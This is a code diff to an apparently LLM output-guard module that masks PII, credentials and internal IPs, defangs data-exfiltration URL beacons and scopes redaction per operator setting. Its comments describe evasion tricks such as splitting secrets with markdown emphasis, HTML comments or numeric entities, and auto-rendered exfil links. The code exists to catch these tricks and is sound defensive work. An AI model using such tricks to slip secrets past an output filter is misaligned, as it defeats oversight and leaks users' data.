+    return _NUMERIC_ENTITY_RE.sub(_one, s)
+
+
+def neutralize_markdown_split_pii(text: str) -> str:
+    """Mask PII/secret hidden by INLINE markdown emphasis interleaved among its chars —
+    the raw bytes evade the redactor but a markdown client renders the value. Only a run
+    whose emphasis-stripped form is a PII/secret is masked, so benign markdown (``a_b_c``,
+    ``**bold**``, `` `code` ``, ``2*3``) is left untouched (strict no-op)."""
+    # Fast-path skip only when NONE of the render-invisible separators can be present:
+    # markdown emphasis (* `) or an HTML tag/comment '<' (G51). ('_' alone never masks.)
+    if not text or not ("*" in text or "`" in text or "<" in text or "&" in text):
+        return text
+
+    def _sub(m: "re.Match[str]") -> str:
+        run = m.group(0)
+        # A single PII/secret/credential value (even 3x-inflated by obfuscation markers) is
+        # short; a very long run is never one value, so skip it — bounds the per-run detect
+        # cost (no ReDoS on a pathological multi-KB run) with no loss of coverage.
+        if len(run) > 512:
+            return run
+        # PIPELINE-0012 / output parity: already smart-masked shapes (j***@a***.com,
+        # ***-**-6789, …) use asterisks as MASKING, not markdown emphasis. Stripping
+        # them reconstructs a weak email and falsely triggers [PII_REDACTED].
+        try:
+            from patterns import contains_smart_redaction_markers as _smart_ok
+        except ImportError:  # pragma: no cover
+            from .patterns import contains_smart_redaction_markers as _smart_ok
+        if _smart_ok(run):
+            return run
+        # G50/G51: strip render-invisible separators (emphasis + HTML comments/empty tags);
+        # '_' stays literal (CommonMark). G52: then DECODE numeric HTML entities (they
+        # render to a char, not nothing).
+        stripped = _decode_numeric_entities(_RENDER_INVIS_STRIP_RE.sub("", run))
+        # G50: also cover CREDENTIAL (bearer/api keys) + internal IP detectors — the
+        # same interleaved-emphasis trick hides an obfuscated ``sk_live_**…**`` token or
+        # ``10.**0**.0.5`` internal IP from the raw-text credential/IP checks.
+        if stripped != run and (
+            detect_pii(stripped) or detect_secrets(stripped)
+            or detect_credential_exposure(stripped) or detect_ip_leakage(stripped)
+        ):
+            return "[PII_REDACTED]"
+        return run
+
+    try:
+        out = _EMPH_HTML_TOKEN_RE.sub(_sub, text)   # pass 1: emphasis + render-invisible HTML
+        out = _ENTITY_TOKEN_RE.sub(_sub, out)        # pass 2: numeric HTML entities
+        return out
+    except Exception:  # noqa: BLE001 - sanitizer must never break the egress
+        return text
+
+
 def sanitize_output_for_verdict(
     response_text: str,
     verdict: OutputVerdict,
     *,
     redact_pii_fn=None,
 ) -> str:
-    """Apply the correct sanitization for an output-guard verdict action."""
+    """Apply the correct sanitization for an output-guard verdict action.
+
+    G13: whatever category won the verdict, the egress is ALWAYS passed through
+    :func:`neutralize_exfil_channels` FIRST as a defense-in-depth pass, so a
+    data-exfiltration beacon can never ride out alongside (e.g.) a PII redact when
+    the PII verdict was selected. Neutralize runs BEFORE core redaction so it sees
+    the original (unmasked) URL — otherwise masking the payload first would hide
+    the exfil signal and leave the auto-render intact. No-op on benign markdown/URLs.
+    G35 adds a symmetric encoded-PII neutralization pass (HTML-entity / percent runs
+    that decode to a PII/secret) so a laundered-output exfil can't ride out either.
+    """
+    neutralized = neutralize_exfil_channels(response_text)
+    neutralized = neutralize_encoded_pii(neutralized)
+    neutralized = neutralize_markdown_split_pii(neutralized)  # G44
+    return _sanitize_output_core(neutralized, verdict, redact_pii_fn=redact_pii_fn)
+
+
+def _sanitize_output_core(
+    response_text: str,
+    verdict: OutputVerdict,
+    *,
+    redact_pii_fn=None,
+) -> str:
+    """Category-specific sanitization for an output-guard verdict action."""
     threat = str(verdict.threat_type or "")
     action = str(verdict.action or "allow")
-    # 1.7: PII / secret / credential (+ pci / phi — C-1) are ALWAYS surgically
-    # redacted (deterministic token-level masking via redact_pii_fn), never
-    # routed through the non-deterministic "rewrite" path — regardless of action.
-    if threat in _REDACTABLE_OUTPUT_CATEGORIES:
-        if redact_pii_fn is not None:
-            return redact_pii_fn(response_text)
-        return "[REDACTED]"
-    # E15: internal infrastructure leakage (internal IP / hostname / URL) is
-    # surgically masked via the deterministic redactor — never whole-response
-    # rewritten — so a REAL internal address that survived FP suppression cannot
-    # egress raw on the client channel, regardless of the configured action
-    # (flag/redact). Kept OUT of _REDACTABLE_OUTPUT_CATEGORIES so an org's explicit
-    # opt-in hard 'block' is preserved (that set also drives the block->redact
-    # downgrade, which must NOT fire for an opt-in IP block).
-    if threat == "ip_leakage":
-        if redact_pii_fn is not None:
-            return redact_pii_fn(response_text)
-        return response_text
+    # G13: an exfil-channel verdict is fixed by the wrapper's neutralize pass
+    # (defang the beacon in place). Here just mask any incidental PII while keeping
+    # the rest of the answer — never nuke the whole response to [REDACTED].
+    if threat == "exfil_channel":
+        return redact_pii_fn(response_text) if redact_pii_fn is not None else response_text
     if action == "rewrite":
-        return rewrite_output_response_text(threat, verdict.detail or None)
+        # Honor UI rewrite for ALL threat types (incl. pii/secret). Surgical
+        # redact above only applies when action is redact/block-downgraded —
+        # previously redactable categories ignored action==rewrite and always
+        # surgically masked, so non-stream sanitize callers could never rewrite.
+        return rewrite_output_response_text(
+            threat,
+            verdict.detail or None,
+            original_text=response_text,
+        )
     if action != "redact":
         return response_text
     if threat == "hallucination":
-        return rewrite_output_response_text(threat, verdict.detail or None)
-    if redact_pii_fn is not None:
-        return redact_pii_fn(response_text)
-    return "[REDACTED]"
+        return rewrite_output_response_text(
+            threat,
+            verdict.detail or None,
+            original_text=response_text,
+        )
+    # STRICT per-class masking: mutate ONLY the classes the operator set to
+    # "redact" (see OutputVerdict.redact_classes). The blanket redact_all() masks
+    # every class at once, which mutated classes the operator set to flag/allow.
+    # An EMPTY redact_classes keeps the legacy unscoped behaviour.
+    _classes = list(getattr(verdict, "redact_classes", None) or [])
+    if threat in _REDACTABLE_OUTPUT_CATEGORIES:
+        if _classes:
+            base = _redact_all_scoped(response_text, set(_classes))
+        else:
+            base = redact_pii_fn(response_text) if redact_pii_fn is not None else "[REDACTED]"
+        # Defensive attribute access: the streaming path (and some producers) hand
+        # in duck-typed verdict objects that may not define every OutputVerdict
+        # field. The previous inline streaming implementation used getattr() here;
+        # now that streaming delegates to this function, keep the same tolerance so
+        # a minimal verdict cannot raise AttributeError mid-stream.
+        spans = list(getattr(verdict, "redaction_spans", None) or []) + [
+            str(v) for v in (getattr(verdict, "matched_values", None) or {}).values()
+        ]
+        return _mask_spans_typed(base, spans, threat)
+    if threat == "ip_leakage":
+        # Same STRICT per-class scoping as the redactable branch above: an
+        # ip_leakage redact must mask ONLY the infra addresses, never the email /
+        # API key belonging to detectors the operator set to flag/allow.
+        if _classes:
+            return _redact_all_scoped(response_text, set(_classes))
+        if redact_pii_fn is not None:
+            return redact_pii_fn(response_text)
+        return response_text
+    # CLASS-LESS THREATS (policy_violation / jailbreak / toxic / injection / guard
+    # model). These have NO spans of their own to mask, and the blanket
+    # redact_pii_fn() here masked PII + credentials + infra — i.e. it enforced on
+    # detector classes the operator may have set to allow/flag. Measured:
+    # Policy=redact with PII=allow, Credential=allow, IP=allow masked the email, the
+    # API key AND the internal IP. A detector's action must never reach outside its
+    # own class.
+    #
+    # "redact" on a class-less threat therefore means "remove the offending output",
+    # which is a deterministic whole-response replacement (identical to how the
+    # hallucination branch above already handles it) — NOT a selective mask of other
+    # detectors' data. Classes the operator DID set to redact are still masked on
+    # their own verdicts via the branches above.
+    return rewrite_output_response_text(
+        threat,
+        verdict.detail or None,
+        original_text=response_text,
+    )
+
+
+def output_verdict_applies_to_delivered_text(
+    verdict: OutputVerdict | None,
+    delivered_text: str,
+) -> bool:
+    """True when at least one matched span appears in the bytes delivered to the client."""
+    if verdict is None or verdict.action not in ("redact", "flag", "block"):
+        return True
+    matched = dict(getattr(verdict, "matched_values", None) or {})
+    if not matched:
+        return True
+    delivered = delivered_text or ""
+    return any(v and v in delivered for v in matched.values())
+
+
+def coalesce_output_guard_verdict_for_delivery(
+    verdict: OutputVerdict | None,
+    *,
+    delivered_text: str,
+) -> OutputVerdict | None:
+    """Downgrade false-positive redact/flag when detection is outside delivered content.
+
+    ``delivered_text`` MUST be the FULL client-delivered envelope, as produced by
+    ``main._client_delivered_output_text`` — never a content-only string. I-01:
+    ``reasoning_content`` / ``refusal`` / ``audio.transcript`` / ``tool_calls`` +
+    ``function_call`` name+arguments / ``annotations`` / choice-level ``logprobs``
+    tokens ARE returned to the client and ARE surfaced by the stock OpenAI SDK, so
+    the earlier content-only delivered text silently discarded genuine leaks in
+    those channels. Suppression is for matches that exist only in bytes the client
+    never sees — a derived/decoded form, or safety-classifier metadata: a
+    smart-masked echo of already-redacted input must not mark the visible answer as
+    redacted (noop redact).
+
+    INVARIANT: this function's notion of "delivered" must stay in lockstep with
+    ``main._neutralize_secondary_output_channels`` + ``_set_completion_response_text``
+    (which blanks logprobs). A channel counted as delivered HERE but not blanked
+    THERE is detected and then shipped anyway; a channel blanked there but not
+    counted here is discarded as a false positive. Add new channels to both.
+    """
+    if verdict is None or verdict.action not in ("redact", "flag"):
+        return verdict
+    if output_verdict_applies_to_delivered_text(verdict, delivered_text):
+        return verdict
+    try:
+        from patterns import is_safety_classifier_output
+    except ImportError:
+        from .patterns import is_safety_classifier_output
+    delivered = (delivered_text or "").strip()
+    if is_safety_classifier_output(delivered):
+        detail = (
+            "Safety classifier metadata only; matched PII was not present in "
+            "delivered model content."
+        )
+    else:
+        detail = (
+            "Matched PII/secret was outside delivered model content "
+            "(non-user-visible channel)."
+        )
+    return OutputVerdict(detail=detail)
 
 
 def output_guard_telemetry_meta(
@@ -924,6 +2083,10 @@ def output_guard_telemetry_meta(
     sanitized_output: str,
 ) -> dict:
     """Shared telemetry fields for output-guard incidents."""
+    redact_noop = (
+        str(getattr(verdict, "action", "") or "").lower() == "redact"
+        and (raw_output or "") == (sanitized_output or "")
+    )
     return {
         "detail": verdict.detail,
         "response_snippet": raw_output,
@@ -936,6 +2099,9 @@ def output_guard_telemetry_meta(
         # telemetry.py _TEXT_KEYS scrub). Mask each value here at the source — the
         # operator console still gets matched_patterns + a masked value, never raw PII.
         "matched_values": {k: _mask_value_for_detail(str(v)) for k, v in (verdict.matched_values or {}).items()},
-        "output_snippet_truncated": True,
+        "output_snippet_truncated": bool(
+            len(raw_output or "") >= 8000 or len(sanitized_output or "") >= 8000
+        ),
         "full_output_scanned": True,
+        "redact_noop": redact_noop,
     }
